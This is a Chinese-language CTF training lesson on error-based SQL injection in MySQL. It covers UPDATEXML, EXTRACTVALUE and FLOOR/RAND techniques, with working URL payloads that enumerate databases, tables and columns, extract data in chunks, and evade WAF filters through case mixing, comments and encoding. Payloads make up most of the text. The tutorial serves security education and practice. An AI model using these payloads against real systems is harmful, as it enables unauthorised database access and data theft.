# Day 20：报错注入——利用数据库错误获取信息

> **学习目标**：理解报错注入原理，掌握常用报错函数，学会利用数据库错误获取信息
> 
> **学习时长**：2小时
> 
> **难度等级**：⭐⭐⭐⭐⭐

---

## 📚 今日内容概览

1. 报错注入原理
2. 常用报错函数
3. UPDATEXML报错注入
4. EXTRACTVALUE报错注入
5. FLOOR报错注入
6. 实战练习

---

## 一、报错注入原理

### 1.1 什么是报错注入

```
报错注入是什么：
  利用数据库的错误信息获取敏感数据
  通过构造恶意SQL语句，使数据库报错
  错误信息中包含我们需要的数据

原理：
  某些SQL函数在执行错误时会将参数内容输出到错误信息中
  攻击者可以利用这一点获取数据库信息

适用场景：
  - 无法使用UNION SELECT（如没有显示位）
  - 数据库会输出详细的错误信息
  - 权限足够执行报错函数

示例：
  SELECT UPDATEXML(1, CONCAT(0x7e, (SELECT database()), 0x7e), 1)
  报错信息会包含数据库名
```

### 1.2 报错注入的条件

```
条件：
  1. 数据库会输出错误信息
  2. 用户权限足够执行报错函数
  3. 可以构造恶意SQL语句
  4. 错误信息会显示在页面上

优点：
  - 不需要显示位
  - 效率高
  - 可以获取大量信息

缺点：
  - 依赖错误信息显示
  - 某些函数有长度限制
  - 可能被WAF拦截
```

### 1.3 报错注入的分类

```
常见报错注入类型：
  1. XML函数报错：UPDATEXML、EXTRACTVALUE
  2. 聚合函数报错：FLOOR、COUNT、RAND
  3. 其他函数报错：GROUP BY、EXP
  
最常用的：
  - UPDATEXML（MySQL 5.1.5+）
  - EXTRACTVALUE（MySQL 5.1.5+）
  - FLOOR（MySQL 5.x）
```

---

## 二、常用报错函数

### 2.1 UPDATEXML函数

```
UPDATEXML是什么：
  MySQL的XML函数，用于更新XML文档
  语法：UPDATEXML(xml_document, xpath_expr, new_value)
  
报错原理：
  xpath_expr参数需要是有效的XPath表达式
  如果包含非法字符（如~），会报错并显示错误信息

Payload格式：
  UPDATEXML(1, CONCAT(0x7e, (SELECT 查询语句), 0x7e), 1)
  
示例：
  SELECT UPDATEXML(1, CONCAT(0x7e, (SELECT database()), 0x7e), 1)
  报错：XPATH syntax error: '~ctf~'
  
注意：
  返回结果长度限制为32位
```

### 2.2 EXTRACTVALUE函数

```
EXTRACTVALUE是什么：
  MySQL的XML函数，用于从XML文档中提取值
  语法：EXTRACTVALUE(xml_document, xpath_expr)
  
报错原理：
  与UPDATEXML类似，xpath_expr参数包含非法字符时会报错

Payload格式：
  EXTRACTVALUE(1, CONCAT(0x7e, (SELECT 查询语句), 0x7e))
  
示例：
  SELECT EXTRACTVALUE(1, CONCAT(0x7e, (SELECT database()), 0x7e))
  报错：XPATH syntax error: '~ctf~'
  
注意：
  返回结果长度限制为32位
```

### 2.3 FLOOR函数

```
FLOOR函数是什么：
  MySQL的数学函数，返回小于等于参数的最大整数
  语法：FLOOR(x)
  
报错原理：
  利用GROUP BY和RAND()的冲突产生报错
  在子查询中使用COUNT(*)和GROUP BY时，RAND()会导致重复键错误

Payload格式：
  SELECT COUNT(*), CONCAT((SELECT 查询语句), FLOOR(RAND(0)*2)) AS x FROM INFORMATION_SCHEMA.TABLES GROUP BY x
  
示例：
  SELECT COUNT(*), CONCAT((SELECT database()), FLOOR(RAND(0)*2)) AS x FROM INFORMATION_SCHEMA.TABLES GROUP BY x
  报错：Duplicate entry 'ctf1' for key 'group_key'
  
注意：
  不需要XML函数支持
  适用于MySQL 5.x版本
```

### 2.4 其他报错方法

```
1. EXP函数：
   SELECT EXP(~(SELECT * FROM (SELECT database())a))
   原理：EXP()函数对负数参数会报错

2. GROUP BY错误：
   SELECT 1 FROM users GROUP BY CONCAT((SELECT database()), FLOOR(RAND(0)*2))
   原理：与FLOOR报错类似

3. GEOMETRYCOLLECTION函数：
   SELECT GEOMETRYCOLLECTION((SELECT * FROM (SELECT database())a))
   原理：参数不是有效的几何对象时会报错
```

---

## 三、UPDATEXML报错注入

### 3.1 基本Payload

```
Payload格式：
  ?id=1 AND UPDATEXML(1, CONCAT(0x7e, (SELECT 查询语句), 0x7e), 1)--
  
示例：
  获取数据库名：
  ?id=1 AND UPDATEXML(1, CONCAT(0x7e, (SELECT database()), 0x7e), 1)--
  
  获取版本信息：
  ?id=1 AND UPDATEXML(1, CONCAT(0x7e, (SELECT @@version), 0x7e), 1)--
  
  获取用户名：
  ?id=1 AND UPDATEXML(1, CONCAT(0x7e, (SELECT user()), 0x7e), 1)--
```

### 3.2 获取表名

```
Payload：
  ?id=1 AND UPDATEXML(1, CONCAT(0x7e, (SELECT GROUP_CONCAT(TABLE_NAME) FROM information_schema.TABLES WHERE TABLE_SCHEMA=database()), 0x7e), 1)--
  
示例：
  注入：?id=1 AND UPDATEXML(1, CONCAT(0x7e, (SELECT GROUP_CONCAT(TABLE_NAME) FROM information_schema.TABLES WHERE TABLE_SCHEMA=database()), 0x7e), 1)--
  报错：XPATH syntax error: '~users,flag,products~'
  
注意：
  如果表名太多，可能被截断（32位限制）
```

### 3.3 获取字段名

```
Payload：
  ?id=1 AND UPDATEXML(1, CONCAT(0x7e, (SELECT GROUP_CONCAT(COLUMN_NAME) FROM information_schema.COLUMNS WHERE TABLE_NAME='flag'), 0x7e), 1)--
  
示例：
  注入：?id=1 AND UPDATEXML(1, CONCAT(0x7e, (SELECT GROUP_CONCAT(COLUMN_NAME) FROM information_schema.COLUMNS WHERE TABLE_NAME='flag'), 0x7e), 1)--
  报错：XPATH syntax error: '~id,flag_content~'
```

### 3.4 获取数据

```
Payload：
  ?id=1 AND UPDATEXML(1, CONCAT(0x7e, (SELECT flag_content FROM flag), 0x7e), 1)--
  
示例：
  注入：?id=1 AND UPDATEXML(1, CONCAT(0x7e, (SELECT flag_content FROM flag), 0x7e), 1)--
  报错：XPATH syntax error: '~flag{error_based_success}~'
  
注意：
  如果数据太长，需要使用SUBSTRING分段获取
```

### 3.5 分段获取长数据

```
Payload：
  获取前32位：
  ?id=1 AND UPDATEXML(1, CONCAT(0x7e, SUBSTRING((SELECT flag_content FROM flag),1,32), 0x7e), 1)--
  
  获取33-64位：
  ?id=1 AND UPDATEXML(1, CONCAT(0x7e, SUBSTRING((SELECT flag_content FROM flag),33,32), 0x7e), 1)--
  
示例：
  注入1：?id=1 AND UPDATEXML(1, CONCAT(0x7e, SUBSTRING((SELECT flag_content FROM flag),1,32), 0x7e), 1)--
  报错：XPATH syntax error: '~flag{this_is_a_long_'
  
  注入2：?id=1 AND UPDATEXML(1, CONCAT(0x7e, SUBSTRING((SELECT flag_content FROM flag),33,32), 0x7e), 1)--
  报错：XPATH syntax error: '~flag_for_testing}~'
  
  合并结果：flag{this_is_a_long_flag_for_testing}
```

---

## 四、EXTRACTVALUE报错注入

### 4.1 基本Payload

```
Payload格式：
  ?id=1 AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT 查询语句), 0x7e))--
  
示例：
  获取数据库名：
  ?id=1 AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT database()), 0x7e))--
  
  获取版本信息：
  ?id=1 AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT @@version), 0x7e))--
```

### 4.2 获取表名和字段名

```
Payload：
  获取表名：
  ?id=1 AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT GROUP_CONCAT(TABLE_NAME) FROM information_schema.TABLES WHERE TABLE_SCHEMA=database()), 0x7e))--
  
  获取字段名：
  ?id=1 AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT GROUP_CONCAT(COLUMN_NAME) FROM information_schema.COLUMNS WHERE TABLE_NAME='flag'), 0x7e))--
```

### 4.3 与UPDATEXML对比

```
对比：
  | 函数 | 语法 | 长度限制 | 适用版本 |
  |-----|-----|---------|---------|
  | UPDATEXML | UPDATEXML(doc, xpath, new) | 32位 | MySQL 5.1.5+ |
  | EXTRACTVALUE | EXTRACTVALUE(doc, xpath) | 32位 | MySQL 5.1.5+ |

共同点：
  - 都基于XPath语法错误
  - 都有32位长度限制
  - 使用方法类似

不同点：
  - UPDATEXML需要3个参数
  - EXTRACTVALUE只需要2个参数
```

---

## 五、FLOOR报错注入

### 5.1 基本Payload

```
Payload格式：
  ?id=1 AND (SELECT COUNT(*) FROM information_schema.TABLES GROUP BY CONCAT(0x7e, (SELECT 查询语句), 0x7e, FLOOR(RAND(0)*2)))--
  
示例：
  获取数据库名：
  ?id=1 AND (SELECT COUNT(*) FROM information_schema.TABLES GROUP BY CONCAT(0x7e, (SELECT database()), 0x7e, FLOOR(RAND(0)*2)))--
  
  报错：Duplicate entry '~ctf~1' for key 'group_key'
  
注意：
  不需要XML函数支持
  适用于MySQL 5.x版本
```

### 5.2 获取表名和字段名

```
Payload：
  获取表名：
  ?id=1 AND (SELECT COUNT(*) FROM information_schema.TABLES GROUP BY CONCAT(0x7e, (SELECT GROUP_CONCAT(TABLE_NAME) FROM information_schema.TABLES WHERE TABLE_SCHEMA=database()), 0x7e, FLOOR(RAND(0)*2)))--
  
  获取字段名：
  ?id=1 AND (SELECT COUNT(*) FROM information_schema.TABLES GROUP BY CONCAT(0x7e, (SELECT GROUP_CONCAT(COLUMN_NAME) FROM information_schema.COLUMNS WHERE TABLE_NAME='flag'), 0x7e, FLOOR(RAND(0)*2)))--
```

### 5.3 FLOOR报错原理

```
原理：
  1. GROUP BY会创建临时表
  2. RAND(0)*2会产生0或1的随机值
  3. COUNT(*)统计时，同一值可能被插入多次
  4. 当尝试插入重复键时，会报Duplicate entry错误
  5. 错误信息中包含CONCAT的内容
  
关键点：
  - 使用FLOOR(RAND(0)*2)而不是RAND()
  - 需要足够多的表（information_schema.TABLES通常足够）
  - CONCAT的内容会出现在错误信息中
```

---

## 六、实战练习

### 6.1 练习1：UPDATEXML报错注入

```
题目：
  URL：http://example.com/user?id=1
  已知存在数字型注入，但没有显示位
  
步骤：
  1. 测试报错注入：
     ?id=1 AND UPDATEXML(1, CONCAT(0x7e, (SELECT database()), 0x7e), 1)--
     报错：XPATH syntax error: '~ctf~'
  
  2. 获取表名：
     ?id=1 AND UPDATEXML(1, CONCAT(0x7e, (SELECT GROUP_CONCAT(TABLE_NAME) FROM information_schema.TABLES WHERE TABLE_SCHEMA=database()), 0x7e), 1)--
     报错：XPATH syntax error: '~users,flag,products~'
  
  3. 获取flag表的字段名：
     ?id=1 AND UPDATEXML(1, CONCAT(0x7e, (SELECT GROUP_CONCAT(COLUMN_NAME) FROM information_schema.COLUMNS WHERE TABLE_NAME='flag'), 0x7e), 1)--
     报错：XPATH syntax error: '~id,flag_value~'
  
  4. 获取flag内容：
     ?id=1 AND UPDATEXML(1, CONCAT(0x7e, (SELECT flag_value FROM flag), 0x7e), 1)--
     报错：XPATH syntax error: '~flag{updatexml_success}~'
```

### 6.2 练习2：EXTRACTVALUE报错注入

```
题目：
  URL：http://example.com/api/data?id=1
  已知UPDATEXML被过滤
  
步骤：
  1. 测试EXTRACTVALUE：
     ?id=1 AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT database()), 0x7e))--
     报错：XPATH syntax error: '~security~'
  
  2. 获取表名：
     ?id=1 AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT GROUP_CONCAT(TABLE_NAME) FROM information_schema.TABLES WHERE TABLE_SCHEMA=database()), 0x7e))--
     报错：XPATH syntax error: '~users,secrets~'
  
  3. 获取secrets表的字段名：
     ?id=1 AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT GROUP_CONCAT(COLUMN_NAME) FROM information_schema.COLUMNS WHERE TABLE_NAME='secrets'), 0x7e))--
     报错：XPATH syntax error: '~id,key,value~'
  
  4. 获取secret内容：
     ?id=1 AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT value FROM secrets WHERE key='flag'), 0x7e))--
     报错：XPATH syntax error: '~flag{extractvalue_success}~'
```

### 6.3 练习3：FLOOR报错注入

```
题目：
  URL：http://example.com/search?q=test
  闭合方式：单引号，XML函数被过滤
  
步骤：
  1. 测试FLOOR报错：
     ?q=test' AND (SELECT COUNT(*) FROM information_schema.TABLES GROUP BY CONCAT(0x7e, (SELECT database()), 0x7e, FLOOR(RAND(0)*2)))--
     报错：Duplicate entry '~ctf~1' for key 'group_key'
  
  2. 获取表名：
     ?q=test' AND (SELECT COUNT(*) FROM information_schema.TABLES GROUP BY CONCAT(0x7e, (SELECT GROUP_CONCAT(TABLE_NAME) FROM information_schema.TABLES WHERE TABLE_SCHEMA=database()), 0x7e, FLOOR(RAND(0)*2)))--
     报错：Duplicate entry '~users,flag~1' for key 'group_key'
  
  3. 获取flag：
     ?q=test' AND (SELECT COUNT(*) FROM information_schema.TABLES GROUP BY CONCAT(0x7e, (SELECT flag FROM flag), 0x7e, FLOOR(RAND(0)*2)))--
     报错：Duplicate entry '~flag{floor_success}~1' for key 'group_key'
```

---

## 七、常见问题解决

### 7.1 问题1：报错函数被过滤

```
现象：
  使用UPDATEXML或EXTRACTVALUE时被拦截

解决方法：
  1. 使用大小写混合：UpDaTeXmL
  2. 使用注释：UPDATE/**/XML
  3. 使用编码：%55%50%44%41%54%45%58%4D%4C
  4. 尝试FLOOR报错注入
  
示例：
  ?id=1 AND UpDaTeXmL(1, CONCAT(0x7e, (SELECT database()), 0x7e), 1)--
  ?id=1 AND UPDATE/**/XML(1, CONCAT(0x7e, (SELECT database()), 0x7e), 1)--
```

### 7.2 问题2：结果被截断

```
现象：
  报错信息只显示部分内容（32位限制）

解决方法：
  使用SUBSTRING分段获取：
  ?id=1 AND UPDATEXML(1, CONCAT(0x7e, SUBSTRING((SELECT flag FROM flag),1,32), 0x7e), 1)--
  ?id=1 AND UPDATEXML(1, CONCAT(0x7e, SUBSTRING((SELECT flag FROM flag),33,32), 0x7e), 1)--
  
示例：
  第一次获取前32位，第二次获取33-64位，依此类推
```

### 7.3 问题3：没有报错信息

```
现象：
  执行报错注入后没有显示错误信息

解决方法：
  1. 检查是否开启了错误显示
  2. 尝试其他报错方法
  3. 改用盲注
  
示例：
  如果报错注入不行，尝试时间盲注或布尔盲注
```

---

## 八、今日总结

### 8.1 知识点回顾

```
✅ 报错注入原理
  - 利用数据库错误信息获取数据
  - 需要错误信息显示在页面上

✅ 常用报错函数
  - UPDATEXML：基于XPath错误
  - EXTRACTVALUE：基于XPath错误
  - FLOOR：基于GROUP BY错误

✅ UPDATEXML报错注入
  - 基本Payload
  - 获取数据库名、表名、字段名、数据
  - 分段获取长数据

✅ EXTRACTVALUE报错注入
  - 与UPDATEXML类似
  - 语法略有不同

✅ FLOOR报错注入
  - 不需要XML函数
  - 适用于MySQL 5.x

✅ 实战练习
  - 三种报错注入方法的实战
```

### 8.2 关键记忆点

```
记住这个口诀：

报错注入真奇妙，错误信息藏情报；
UPDATEXML最常用，EXTRACTVALUE也好用；
FLOOR报错不依赖XML，老版本MySQL也能搞；
32位限制不用怕，SUBSTRING来分段拿！

流程：
  测试报错函数 → 获取数据库名 → 获取表名 → 获取字段名 → 获取数据
```

### 8.3 今日作业

```
必做题：
  1. 完成三个练习题目
  2. 记录报错注入步骤
  3. 获取Flag

选做题：
  1. 练习分段获取长数据
  2. 尝试绕过WAF
  3. 在CTFHub找题目练习

提交内容：
  - 步骤记录
  - Flag截图
  - 总结
```

### 8.4 明日预告

```
Day 21：盲注突破

学习内容：
  - 布尔盲注原理
  - 时间盲注原理
  - 实战练习
```

---

**恭喜你完成Day 20的学习！明天学习盲注突破！** 🎉
